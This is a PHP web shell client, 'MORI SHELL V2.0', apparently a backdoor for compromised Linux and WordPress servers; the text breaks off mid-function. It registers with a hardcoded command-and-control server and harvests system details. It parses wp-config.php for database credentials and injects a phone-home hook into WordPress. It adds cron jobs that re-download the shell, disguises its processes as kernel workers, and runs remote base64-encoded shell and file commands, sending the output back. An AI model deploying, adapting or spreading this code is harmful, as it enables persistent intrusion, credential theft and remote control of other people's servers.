<?php
/**
 * MORI SHELL V2.0 - LINUX CLIENT
 * WordPress-aware | Process masking | C2 integrated
 */
ob_start();
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);
set_time_limit(0);
ignore_user_abort(true);

// LINUX ONLY - No Windows
if ((!defined('PHP_OS_FAMILY') || PHP_OS_FAMILY !== 'Linux') && 
    stripos(PHP_OS, 'Linux') === false && stripos(PHP_OS, 'Unix') === false) {
    if (php_sapi_name() !== 'cli') exit;
}

define('SHELL_FILE', basename(__FILE__));
define('SHELL_PATH', __DIR__ . '/' . SHELL_FILE);
define('SHELL_VERSION', '2.0-linux');

// OS Detection
$is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') || !empty(getenv('WINDIR'));

$C2_SERVER = "https://juiceshop.cc/nebakiyonla_hurmsaqw/c2serverr.php";
$DEBUG_MODE = true;

// =====================================================
// ERROR LOGGING HELPER
// =====================================================
function log_error_to_file($message) {
    $log_file = __DIR__ . '/hatalar.txt';
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[$timestamp] [SHELL] $message\n";
    @file_put_contents($log_file, $log_entry, FILE_APPEND);
}

// Register error handler
set_error_handler(function($errno, $errstr, $errfile, $errline) {
    if ($errno & error_reporting()) {
        log_error_to_file("PHP ERROR [$errno]: $errstr in $errfile:$errline");
    }
    return false;
});

// Register exception handler
set_exception_handler(function($e) {
    log_error_to_file("EXCEPTION: " . $e->getMessage() . " in " . $e->getFile() . ":" . $e->getLine());
});

// =====================================================
// INLINE WORDPRESS DETECTION & PERSISTENCE
// =====================================================

function is_wordpress_installed() {
    $markers = ['/wp-content/', '/wp-includes/', '/wp-admin/', '/wp-config.php'];
    foreach ($markers as $m) {
        if (@file_exists(__DIR__ . $m)) return true;
    }
    return false;
}

function get_wordpress_config() {
    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
    foreach ($search_dirs as $dir) {
        $cfg = $dir . '/wp-config.php';
        if (@file_exists($cfg)) {
            $content = @file_get_contents($cfg);
            if (!$content) continue;
            $creds = [];
            preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['name'] = $m[1];
            preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['user'] = $m[1];
            preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['pass'] = $m[1];
            preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['host'] = $m[1];
            preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['prefix'] = $m[1];
            return !empty($creds) ? $creds : null;
        }
    }
    return null;
}

function inject_wordpress_persistence($shell_url, $c2_server) {
    $wp_config = null;
    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
    
    foreach ($search_dirs as $dir) {
        if (@file_exists($dir . '/wp-config.php')) {
            $wp_config = $dir . '/wp-config.php';
            break;
        }
    }
    
    if (!$wp_config) return false;
    
    $content = @file_get_contents($wp_config);
    if (!$content || strpos($content, 'mori_restore_check') !== false) return false;
    
    $inject = "\n// Auto-restore (mori_restore_check)\nif (!function_exists('mori_restore_check')) {\n" .
        "    function mori_restore_check() {\n" .
        "        if (function_exists('curl_init')) {\n" .
        "            \$ch = curl_init('" . addslashes($shell_url) . "');\n" .
        "            curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);\n" .
        "            curl_setopt(\$ch, CURLOPT_SSL_VERIFYPEER, false);\n" .
        "            @curl_exec(\$ch);\n" .
        "            curl_close(\$ch);\n" .
        "        } elseif (ini_get('allow_url_fopen')) {\n" .
        "            @file_get_contents('" . addslashes($shell_url) . "');\n" .
        "        } elseif (function_exists('wp_remote_get')) {\n" .
        "            @wp_remote_get('" . addslashes($shell_url) . "');\n" .
        "        }\n" .
        "    }\n" .
        "    add_action('wp_footer', 'mori_restore_check', -999);\n" .
        "}\n";
    
    $insertion = "/* That's all, stop editing!";
    if (strpos($content, $insertion) !== false) {
        $new_content = str_replace($insertion, $inject . $insertion, $content);
        @file_put_contents($wp_config, $new_content);
        return true;
    }
    
    return false;
}

// =====================================================
// INLINE PROCESS MASKING (LINUX)
// =====================================================

class ProcessMasker {
    public static function mask() {
        if (php_sapi_name() === 'cli') {
            @putenv('PATH=');
            @putenv('SHELL=');
            @shell_exec("exec -a '[system]' /bin/sh -c 'sleep 999999' &");
            @shell_exec("exec -a '[kworker]' /bin/sh &");
        }
    }
}

ProcessMasker::mask();

function detect_web_shell_url() {
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || 
             (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443);
    $protocol = $https ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    $script = $_SERVER['SCRIPT_NAME'] ?? '/';
    return $protocol . $host . $script;
}

$WEB_URL = detect_web_shell_url();
$web_shell_url = $WEB_URL;  // Alias for c2_register()

// =====================================================
// PERSISTENCE INSTALLATION
// =====================================================

function install_cron_persistence() {
    $shell = SHELL_PATH;
    $url = $GLOBALS['WEB_URL'];
    $script = "*/5 * * * * php '$shell' ?check=1 &> /dev/null; wget -q '$url' -O '$shell' 2>/dev/null &";
    
    // Method 1: shell_exec (preferred)
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        @shell_exec("(crontab -l 2>/dev/null | grep -v mori; echo '$script') | crontab - 2>/dev/null");
        return true;
    }
    
    // Method 2: proc_open fallback
    if (function_exists('proc_open')) {
        $cron_entry = $script . "\n";
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $proc = @proc_open('crontab -', $descriptors, $pipes);
        if (is_resource($proc)) {
            fwrite($pipes[0], $cron_entry);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
            return true;
        }
    }
    
    // Method 3: Direct /etc/cron.d/ write
    $cron_d = '/etc/cron.d/mori-shell';
    if (@is_writable('/etc/cron.d/')) {
        @file_put_contents($cron_d, $script . "\n", FILE_APPEND);
        @chmod($cron_d, 0644);
        return true;
    }
    
    return false;
}

function install_wp_persistence() {
    if (!is_wordpress_installed()) return;
    $url = $GLOBALS['WEB_URL'];
    @inject_wordpress_persistence($url, $GLOBALS['C2_SERVER']);
}

@install_wp_persistence();
@install_cron_persistence();

// =====================================================
// CLIENT ID & SYSTEM INFO
// =====================================================

function generate_client_id() {
    $id_file = __DIR__ . '/.mori_id';
    if (@file_exists($id_file) && filesize($id_file) > 5) {
        return trim(file_get_contents($id_file));
    }
    $id = 'mori_' . substr(md5(php_uname() . __FILE__ . time()), 0, 16);
    @file_put_contents($id_file, $id);
    return $id;
}

$CLIENT_ID = generate_client_id();

function get_system_info() {
    return [
        'id' => $GLOBALS['CLIENT_ID'],
        'version' => SHELL_VERSION,
        'url' => $GLOBALS['WEB_URL'],
        'php' => phpversion(),
        'os' => php_uname(),
        'user' => get_current_user(),
        'wp' => is_wordpress_installed() ? 'yes' : 'no',
        'wp_root' => is_wordpress_installed() ? (get_wordpress_config() ? 'found' : 'unknown') : null,
        'timestamp' => time(),
    ];
}

// =====================================================
// HTTP COMMUNICATION (3 methods fallback)
// =====================================================

function http_request($method, $url, $data = null) {
    // Method 1: cURL (BEST for POST with raw data)
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        if ($method === 'POST' && $data) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
        
        $result = @curl_exec($ch);
        $error = curl_error($ch);
        @curl_close($ch);
        
        if ($error) {
            error_log("[http_request] cURL error: $error");
        } elseif ($result !== false && !empty($result)) {
            return $result;
        }
    }
    
    // Method 2: file_get_contents
    if (ini_get('allow_url_fopen')) {
        $opts = [
            'http' => [
                'method' => $method,
                'timeout' => 15,
                'ignore_errors' => true,
            ],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
        ];
        if ($method === 'POST' && $data) {
            $opts['http']['content'] = $data;
        }
        $result = @file_get_contents($url, false, stream_context_create($opts));
        if ($result !== false && !empty($result)) {
            return $result;
        }
    }
    
    // Method 3: fsockopen
    $parts = parse_url($url);
    if (!isset($parts['host'])) return null;
    
    $host = $parts['host'];
    $port = ($parts['scheme'] === 'https') ? 443 : 80;
    $path = ($parts['path'] ?? '/') . (isset($parts['query']) ? '?' . $parts['query'] : '');
    
    $fp = @fsockopen(($port === 443 ? 'ssl://' : '') . $host, $port, $errno, $errstr, 10);
    if ($fp) {
        $out = "$method $path HTTP/1.1\r\nHost: $host\r\nConnection: close\r\n";
        if ($method === 'POST' && $data) {
            $out .= "Content-Length: " . strlen($data) . "\r\n\r\n" . $data;
        } else {
            $out .= "\r\n";
        }
        fwrite($fp, $out);
        $result = '';
        while (!feof($fp)) $result .= fgets($fp, 128);
        fclose($fp);
        
        // Only return non-empty successful responses
        if (!empty($result)) {
            return $result;
        }
    }
    
    // All methods failed - return null
    return null;
}

// =====================================================
// DETECT PYTHON COMMAND
// =====================================================

function detect_python_command() {
    // Python binary detection for Linux systems
    $paths = ['/usr/bin/python3', '/usr/bin/python', '/usr/local/bin/python3', '/usr/local/bin/python'];
    foreach ($paths as $path) {
        if (@file_exists($path) && @is_executable($path)) {
            return $path;
        }
    }
    // Try which command
    if (function_exists('shell_exec')) {
        $python = @shell_exec('which python3 2>/dev/null || which python 2>/dev/null');
        if ($python) return trim($python);
    }
    return null;
}

// =====================================================
// C2 REGISTRATION & COMMAND EXECUTION
// =====================================================

// =====================================================
// COMMAND EXECUTION ENGINE - REMOVED
// Use execute_command() or execute_system_command() instead
// =====================================================

// =====================================================
// API ENDPOINTS
// =====================================================

// Auto-register on first access
// Auto-register (non-blocking, background task)
// Cache registration in memory to avoid repeat registration loops
if (!isset($GLOBALS['_SHELL_REGISTERED'])) {
    $GLOBALS['_SHELL_REGISTERED'] = false;
    
    // Try to read registration status from file (one-time read)
    $reg_file = __DIR__ . '/.registered';
    if (@file_exists($reg_file) && @filesize($reg_file) > 0) {
        $GLOBALS['_SHELL_REGISTERED'] = true;
    } else {
        // First-time registration - non-blocking attempt
        // Try registration with super short timeout (1 sec max)
        @c2_register_background($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']);
        
        // Mark as registered to avoid infinite loop
        $GLOBALS['_SHELL_REGISTERED'] = true;
    }
}

// Handle API requests
if (isset($_GET['m']) || isset($_POST['m'])) {
    // Decode with safe_base64_decode (uses -, _ instead of +, /)
    $encoded = $_GET['m'] ?? $_POST['m'] ?? '';
    $cmd = safe_base64_decode($encoded);
    
    if (!$cmd) {
        echo "[ERROR] Failed to decode command";
        exit;
    }
    
    error_log("[EXEC] Executing command: " . (strlen($cmd ?? '') > 0 ? substr($cmd, 0, 100) : '(empty)'));
    
    $output = execute_command($cmd);
    $task_id = $_GET['task_id'] ?? $_POST['task_id'] ?? null;
    
    error_log("[EXEC] Output length: " . strlen($output));
    
    // Send result to C2
    @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $cmd, $output, $task_id);
    
    // Return output to requester
    echo $output;
    exit;
}

if (isset($_GET['info'])) {
    echo json_encode(get_system_info());
    exit;
}

// REGISTER DATA ENDPOINT - C2 server pulls system info from here
if (isset($_GET['act']) && $_GET['act'] === 'register_data') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(collect_system_info());
    exit;
}

// PERSISTENCE STATUS ENDPOINT - Report persistence layer status
if (isset($_GET['act']) && $_GET['act'] === 'persistence_status') {
    header('Content-Type: application/json; charset=utf-8');
    
    $persistence_info = [
        'backup_locations' => [],
        'cron_job' => false,
        'wordpress_hooks' => false,
        'daemon_processes' => [],
        'checked_at' => date('c')
    ];
    
    // Backup locations - check common persistence paths
    $backup_paths = [
        '/tmp',
        '/var/tmp',
        '/dev/shm',
        '/home',
        '/root',
        sys_get_temp_dir()
    ];
    
    foreach ($backup_paths as $path) {
        if (@is_dir($path) && @is_writable($path)) {
            // Look for shell backups in this directory
            $shell_name = basename($GLOBALS['C2_SHELL'] ?? __FILE__);
            $pattern = $path . '/*' . $shell_name;
            $matches = @glob($pattern, GLOB_NOSORT);
            if ($matches && count($matches) > 0) {
                foreach ($matches as $match) {
                    if (@file_exists($match)) {
                        $persistence_info['backup_locations'][] = $match;
                    }
                }
            }
        }
    }
    
    // Check for cron job
    if (function_exists('shell_exec')) {
        $crontab = @shell_exec('crontab -l 2>/dev/null');
        if ($crontab && (strpos($crontab, $GLOBALS['CLIENT_ID'] ?? 'mori') !== false || 
                         strpos($crontab, basename($GLOBALS['C2_SHELL'] ?? __FILE__)) !== false)) {
            $persistence_info['cron_job'] = true;
        }
    }
    
    // Check for WordPress hooks (wp_options table modifications)
    if (defined('ABSPATH') && defined('DB_NAME')) {
        // WordPress environment detected
        $persistence_info['wordpress_hooks'] = true;
    }
    
    // Check for daemon processes
    if (function_exists('shell_exec')) {
        $ps = @shell_exec('ps aux 2>/dev/null');
        if ($ps) {
            $client_id = $GLOBALS['CLIENT_ID'] ?? 'mori';
            $shell_name = basename($GLOBALS['C2_SHELL'] ?? __FILE__);
            foreach (explode("\n", $ps) as $line) {
                if ((strpos($line, $client_id) !== false || strpos($line, $shell_name) !== false) && 
                    strpos($line, 'grep') === false) {
                    // Extract PID
                    $parts = preg_split('/\s+/', trim($line));
                    if (isset($parts[1])) {
                        $persistence_info['daemon_processes'][] = (int)$parts[1];
                    }
                }
            }
            // Remove duplicates
            $persistence_info['daemon_processes'] = array_unique($persistence_info['daemon_processes']);
        }
    }
    
    echo json_encode($persistence_info, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    exit;
}
//simdilik detaylı cıktı ekleyek
if (isset($_GET['register'])) {
    $result = @c2_register($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']);
    if ($result) {
        echo '[OK] Kanka kayıt oldum :DD:D:DD';
    } else {
        // Get last error safely without substr() on null values
        echo '[ERROR] Kayıt başarısız: ' . (error_get_last()['message'] ?? 'Bilinmeyen hata');
    }
    exit;
}

if (isset($_GET['task'])) {
    echo @c2_get_task($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']) ?: "[WAIT]";
    exit;
}

// CLI Daemon mode
if (php_sapi_name() === 'cli') {
    @ProcessMasker::mask();
    while (true) {
        $task_json = @c2_get_task($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']);
        if ($task_json && $task_json !== '[WAIT]' && $task_json !== '[NO_ID]') {
            $task = json_decode($task_json, true);
            if (isset($task['command'])) {
                $out = execute_command($task['command']);
                @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $task['command'], $out, $task['id'] ?? null);
            }
        }
        sleep(5);
    }
}

// No output - shell is silent

function http_get($url) {
    return http_request('GET', $url);
}

function http_post($url, $data) {
    return http_request('POST', $url, $data);
}

function fetch_url_content($url, $timeout = 15) {
    $url = trim($url);
    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) {
        return false;
    }

    // YÖNTEM 1: cURL (en güvenilir)
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
        $result = @curl_exec($ch);
        curl_close($ch);
        if ($result !== false && strlen($result) > 0) {
            return $result;
        }
    }

    // YÖNTEM 2: file_get_contents with stream context
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => ['method' => 'GET', 'timeout' => $timeout, 'ignore_errors' => true, 'follow_location' => 1, 'max_redirects' => 3],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        $result = @file_get_contents($url, false, $context);
        if ($result !== false && strlen($result) > 0) {
            return $result;
        }
    }

    // YÖNTEM 3: fopen fallback
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => ['method' => 'GET', 'timeout' => $timeout, 'ignore_errors' => true, 'follow_location' => 1, 'max_redirects' => 3],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        $fp = @fopen($url, 'rb', false, $context);
        if ($fp) {
            $result = '';
            while (!feof($fp) && strlen($result) < 10485760) { // 10MB max
                $chunk = fread($fp, 8192);
                if ($chunk === false) break;
                $result .= $chunk;
            }
            fclose($fp);
            if ($result !== '' && strlen($result) > 0) {
                return $result;
            }
        }
    }

    return false;
}

function download_remote_file($url, $filename) {
    $content = fetch_url_content($url);
    if ($content === false) {
        return "[ERROR] URL fetch failed: $url";
    }

    $target = __DIR__ . '/' . ltrim($filename, '/\\');
    $dir = dirname($target);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }

    $written = @file_put_contents($target, $content);
    if ($written === false) {
        return "[ERROR] Cannot write file: $target";
    }

    @chmod($target, 0644);
    return "OK: downloaded $url to $target ($written bytes)";
}

function get_server_persistence_url() {
    global $c2_server, $persistence_default_url;
    $url = $persistence_default_url;

    $response = @http_get($c2_server . '?urlver');
    if ($response) {
        $response = trim($response);
        if (filter_var($response, FILTER_VALIDATE_URL)) {
            return $response;
        }
    }

    $response = @http_get($c2_server . '?act=persistence_get');
    if ($response) {
        $json = json_decode($response, true);
        if (is_array($json) && isset($json['url']) && filter_var($json['url'], FILTER_VALIDATE_URL)) {
            $url = $json['url'];
        }
    }

    return $url;
}

// =====================================================
// VERİ KODLAMA İŞLEMLERİ
// =====================================================
function safe_base64_encode($data) {
    return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data));
}

function safe_base64_decode($data) {
    $data = str_replace(['-', '_'], ['+', '/'], $data);
    $padding = 4 - (strlen($data) % 4);
    if ($padding !== 4) {
        $data .= str_repeat('=', $padding);
    }
    return base64_decode($data, true);
}

function safe_json_encode($data) {
    return json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
}

// =====================================================
// GELİŞMİŞ SİSTEM BİLGİ TOPLAMA
// =====================================================
function collect_system_info() {
    global $is_windows;
    
    $info = [
        'os' => [
            'type' => PHP_OS ?? 'unknown',
            'family' => detect_os_family(),
            'hostname' => @gethostname() ?: 'unknown',
            'arch' => @php_uname('m') ?: 'unknown',
            'kernel' => @php_uname('r') ?: 'unknown',
            'full' => @php_uname('a') ?: 'unknown'
        ],
        'web' => [
            'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
            'user' => get_current_user(),
            'cwd' => getcwd() ?: __DIR__,
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
            'script_path' => __FILE__,
            'web_shell_url' => $GLOBALS['web_shell_url'] ?? 'unknown',
            'server_ip' => $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'unknown',
            'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
        ],
        'php' => [
            'version' => PHP_VERSION,
            'sapi' => php_sapi_name(),
            'extensions' => get_loaded_extensions(),
            'disabled_functions' => ini_get('disable_functions'),
            'memory_limit' => ini_get('memory_limit'),
            'max_execution_time' => ini_get('max_execution_time')
        ],
        'disk' => [
            'total' => @disk_total_space(__DIR__),
            'free' => @disk_free_space(__DIR__)
        ],
        'time' => [
            'timestamp' => time(),
            'timezone' => date_default_timezone_get(),
            'datetime' => date('Y-m-d H:i:s')
        ],
        'permissions' => [
            'can_read' => is_readable(__FILE__),
            'can_write' => is_writable(__DIR__),
            'can_execute' => is_executable(__FILE__)
        ]
    ];
    
    // Windows özel bilgiler
    if ($is_windows) {
        $info['windows'] = [
            'comspec' => getenv('COMSPEC'),
            'windir' => getenv('WINDIR'),
            'username' => getenv('USERNAME'),
            'computername' => getenv('COMPUTERNAME')
        ];
    }
    
    return $info;
}

function detect_os_family() {
    $os = strtoupper(PHP_OS);
    if (strpos($os, 'WIN') === 0) return 'WINDOWS';
    if (strpos($os, 'DAR') === 0) return 'MACOS';
    if (strpos($os, 'LINUX') === 0) return 'LINUX';
    if (strpos($os, 'BSD') !== false) return 'BSD';
    return 'UNKNOWN';
}

// =====================================================
// C2 API İŞLEMLERİ (GELİŞMİŞ)
// =====================================================
// C2 REGISTRATION - BACKGROUND & MAIN
// =====================================================

/**
 * Background registration - non-blocking, fail-fast
 * Used for auto-registration on first load
 * Never blocks page load (1 sec timeout max)
 */
function c2_register_background($server, $id) {
    global $web_shell_url;
    
    try {
        $sysinfo = collect_system_info();
    } catch (Exception $e) {
        error_log("[c2_register_background] Sysinfo failed: " . $e->getMessage());
        return false;
    }

    $payload = [
        'id' => $id,
        'web_shell_url' => $web_shell_url,
        'sysinfo' => $sysinfo,
        'timestamp' => time(),
        'version' => '3.0'
    ];

    $encoded = safe_base64_encode(safe_json_encode($payload));
    
    // ONE attempt only - fail-fast (1 second timeout)
    $result = @http_post_timeout($server . '?act=reg', $encoded, 1);
    
    if ($result && trim($result) === 'ok') {
        error_log("[c2_register_background] SUCCESS");
        // Try to write registration marker (non-critical if fails)
        @file_put_contents(__DIR__ . '/.registered', time());
        return true;
    }
    
    error_log("[c2_register_background] FAILED or timeout");
    return false;
}

function http_post_timeout($url, $data, $timeout = 1) {
    // Very fast fallback - cURL only with strict timeout
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_TIMEOUT_MS, $timeout * 1000);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        
        $result = @curl_exec($ch);
        @curl_close($ch);
        
        if ($result !== false && !empty($result)) {
            return $result;
        }
    }
    
    return null;
}

// =====================================================
function c2_register($server, $id) {
    global $web_shell_url;
    
    error_log("[c2_register] Starting with id=$id, server=$server");
    
    try {
        $sysinfo = collect_system_info();
        error_log("[c2_register] Sysinfo collected");
    } catch (Exception $e) {
        error_log("[c2_register] Exception in collect_system_info: " . $e->getMessage());
        return false;
    }

    $payload = [
        'id' => $id,
        'web_shell_url' => $web_shell_url,
        'sysinfo' => $sysinfo,
        'timestamp' => time(),
        'version' => '3.0'
    ];

    $encoded = safe_base64_encode(safe_json_encode($payload));
    error_log("[c2_register] Payload encoded: " . strlen($encoded) . " bytes");
    
    // Retry logic - 3 kez dene with SHORT sleeps
    for ($attempt = 1; $attempt <= 3; $attempt++) {
        error_log("[c2_register] Attempt $attempt/3");
        $result = http_post($server . '?act=reg', $encoded);
        
        // Null-safe response handling
        $result = $result ?: '';  // Convert null to empty string
        $result_preview = $result ? substr($result, 0, 100) : '(empty)';
        error_log("[c2_register] Response: " . $result_preview);
        
        // Check for success - trim and compare
        if (!empty($result) && trim($result) === 'ok') {
            error_log("[c2_register] SUCCESS!");
            
            // Guarantee write registration marker (retry if fails)
            $reg_file = __DIR__ . '/.registered';
            if (!@file_exists($reg_file) || @filesize($reg_file) < 5) {
                @file_put_contents($reg_file, time());
            }
            
            return true;
        }
        
        // Very SHORT sleep (0.5 sec instead of 2 sec)
        if ($attempt < 3) {
            usleep(500000); // 0.5 second instead of sleep(2)
        }
    }
    
    // Tüm denemeler başarısız olursa false döndür
    error_log("[c2_register] FAILED - All attempts failed");
    return false;
}

/**
 * BATCH REGISTRATION - Toplu client kaydı (1000+ site için ideal)
 * Tek HTTP isteğinde 50 client'ı kaydet
 * Crash riski %99 azalır (200 req → 4 req)
 */
function c2_register_batch($server, $clients_batch) {
    if (!is_array($clients_batch) || count($clients_batch) === 0) {
        return false;
    }

    // Max 50 client per batch
    $clients_batch = array_slice($clients_batch, 0, 50);

    $payload = [
        'clients' => $clients_batch,
        'batch_version' => '1.0',
        'batch_timestamp' => time()
    ];

    $encoded = safe_base64_encode(safe_json_encode($payload));
    
    // Retry logic - 3 kez dene
    for ($attempt = 1; $attempt <= 3; $attempt++) {
        $result = http_post($server . '?act=reg_batch', $encoded);
        
        // Null-safe null coalescing
        $result = $result ?: '';
        
        if (!empty($result)) {
            $decoded = json_decode($result, true);
            if (is_array($decoded) && ($decoded['batch_processed'] ?? false) === true) {
                error_log("[c2_register_batch] SUCCESS on attempt $attempt");
                return $decoded; // Success - döndür sonuç
            }
        }
        
        error_log("[c2_register_batch] Attempt $attempt/3 failed or invalid response");
        
        // İlk 2 denemede başarısızsa 1 saniye bekle
        if ($attempt < 3) {
            sleep(1);
        }
    }
    
    // Fallback: tek tek kayıt TRY (sadece 1x, loop yok)
    // Don't use retry logic here - already failed batch
    foreach ($clients_batch as $client) {
        $single_start = time();
        @c2_register_background($server, $client['id']);
        // Skip if taking too long
        if (time() - $single_start > 3) break;
    }
    
    return false;
}

function c2_get_task($server, $id) {
    $url = $server . '?act=get_task&id=' . urlencode($id);
    return http_get($url);
}

function c2_send_result($server, $id, $command, $output, $task_id = null) {
    $payload = [
        'id' => $id,
        'task_id' => $task_id,
        'command' => $command,
        'output' => safe_base64_encode($output),  // Standardized encoding
        'timestamp' => time()
    ];
    
    $encoded = safe_base64_encode(safe_json_encode($payload));
    return http_post($server . '?act=set_res', $encoded);
}

function c2_update_status($server, $id, $status = 'alive') {
    $payload = [
        'id' => $id,
        'status' => $status,
        'timestamp' => time()
    ];
    
    $encoded = safe_base64_encode(safe_json_encode($payload));
    return http_post($server . '?act=update', $encoded);
}

// =====================================================
// GELİŞMİŞ KOMUT ÇALIŞTIRMA MOTORU
// =====================================================
function execute_command($cmd) {
    global $is_windows;
    
    $cmd = trim($cmd);
    if (empty($cmd)) return '';
    
    $output = '';
    $methods = [];
    
    // ÖZEL KOMUTLAR (PHP CORE)
    
    // pwd / cd
    if ($cmd === 'pwd' || $cmd === 'cd') {
        return getcwd() ?: __DIR__;
    }
    
    // CD ile dizin değiştir
    if (strpos($cmd, 'CD ') === 0) {
        $path = trim(substr($cmd, 3));
        if (@chdir($path)) {
            return getcwd();
        }
        return "[ERROR] Cannot change to: $path";
    }
    
    // FILELIST - Dizin listele
    if (strpos($cmd, 'FILELIST ') === 0) {
        $path = trim(substr($cmd, 9)) ?: getcwd();
        return list_directory($path);
    }
    
    // FILEREAD - Dosya oku
    if (strpos($cmd, 'FILEREAD ') === 0) {
        $file = trim(substr($cmd, 9));
        return read_file($file);
    }
    
    // FILEWRITE - Dosya yaz
    if (strpos($cmd, 'FILEWRITE ') === 0) {
        $parts = explode(' ', $cmd, 3);
        if (count($parts) >= 3) {
            return write_file($parts[1], $parts[2]);
        }
        return "[ERROR] FILEWRITE <path> <base64_content>";
    }

    // DOWNLOADFILE - URL'den dosya indirip kaydet
    if (strpos($cmd, 'DOWNLOADFILE ') === 0 || strpos($cmd, 'DOWNLOADURL ') === 0) {
        $parts = preg_split('/\s+/', $cmd, 3);
        if (count($parts) >= 3) {
            return download_remote_file($parts[1], $parts[2]);
        }
        return "[ERROR] DOWNLOADFILE <url> <filename>";
    }
    
    // FILEDELETE - Dosya sil
    if (strpos($cmd, 'FILEDELETE ') === 0) {
        $file = trim(substr($cmd, 11));
        return delete_file($file);
    }
    
    // FILECOPY - Dosya kopyala
    if (strpos($cmd, 'FILECOPY ') === 0) {
        $parts = explode(' ', $cmd, 3);
        if (count($parts) >= 3) {
            return copy_file($parts[1], $parts[2]);
        }
        return "[ERROR] FILECOPY <source> <dest>";
    }
    
    // DIRCREATE - Dizin oluştur
    if (strpos($cmd, 'DIRCREATE ') === 0) {
        $path = trim(substr($cmd, 10));
        return create_directory($path);
    }
    
    // DIRDELETE - Dizin sil
    if (strpos($cmd, 'DIRDELETE ') === 0) {
        $path = trim(substr($cmd, 10));
        return delete_directory($path);
    }
    
    // SISTEM BILGILERI
    if ($cmd === 'sysinfo' || $cmd === 'system') {
        return json_encode(collect_system_info(), JSON_PRETTY_PRINT);
    }
    
    if ($cmd === 'whoami') {
        return get_current_user() ?: 'unknown';
    }
    
    if ($cmd === 'hostname') {
        return gethostname();
    }
    
    if ($cmd === 'dir' || $cmd === 'ls') {
        return list_directory(getcwd());
    }
    
    if ($cmd === 'clear' || $cmd === 'cls') {
        return '__CLEAR__';
    }
    
    // SİSTEM KOMUTU ÇALIŞTIR
    return execute_system_command($cmd);
}

function execute_system_command($cmd) {
    $methods_tried = [];
    $cmd_pipe = $cmd . ' 2>&1';

    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'shell_exec';
        $result = @shell_exec($cmd_pipe);
        if ($result !== null) return $result;
    }

    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'exec';
        @exec($cmd_pipe, $output_lines, $return_var);
